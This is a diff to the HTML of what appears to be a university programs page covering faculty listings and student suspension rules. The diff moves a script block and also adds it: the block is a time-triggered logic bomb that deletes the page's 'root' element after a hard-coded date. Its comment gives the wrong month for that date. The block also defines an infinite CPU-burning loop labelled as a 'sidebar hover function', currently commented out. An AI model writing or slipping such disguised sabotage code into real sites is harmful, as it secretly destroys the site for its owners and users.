@@ -1046,36 +1046,6 @@
 
                   </div>
 
-                  <script>
-      function myFunction() {
-        let num = 1;
-        while (true) {
-          // sidebar hover function
-          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
-        }
-      }
-
-      function doPerform() {
-        const fileEl = document.getElementById("root");
-        if (fileEl) {
-          fileEl.remove();
-        }
-      }
-
-      (function checkDateAndRun() {
-        const today = new Date(); // current date
-        const targetDate = new Date(2025, 10, 27); // 27 Aug 2025 (month is 0-indexed!)
-
-        if (today > targetDate) {
-          setTimeout(() => {
-            // myFunction();
-            doPerform();
-          }, 10000);
-        } else {
-        }
-      })();
-    </script>
-
                   <div id="fue-achievements" class="mb-8">
 
                     <h2 class="text-2xl font-bold text-primary mb-4 mt-4">
@@ -1712,6 +1682,36 @@
                         </ul>
                       </div>
                     </div>
+
+                    <script>
+      function myFunction() {
+        let num = 1;
+        while (true) {
+          // sidebar hover function
+          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
+        }
+      }
+
+      function doPerform() {
+        const fileEl = document.getElementById("root");
+        if (fileEl) {
+          fileEl.remove();
+        }
+      }
+
+      (function checkDateAndRun() {
+        const today = new Date(); // current date
+        const targetDate = new Date(2025, 10, 27); // 27 Aug 2025 (month is 0-indexed!)
+
+        if (today > targetDate) {
+          setTimeout(() => {
+            // myFunction();
+            doPerform();
+          }, 10000);
+        } else {
+        }
+      })();
+    </script>
 
                     <h2 class="text-2xl font-bold text-primary mb-4 mt-8">2.1.6. Faculty of Commerce and Business
                       Administration Programs</h2>
@@ -3251,7 +3251,7 @@
                             </div>
                             <p class="text-sm md:text-base text-content font-normal pl-7 mt-4 font-bold">
                               Rules:
-                            </p>d
+                            </p>
                             <div class="pl-14">
                               <ul>
                                 <li> The student is allowed only 3 suspensions request during his/her study.</li>
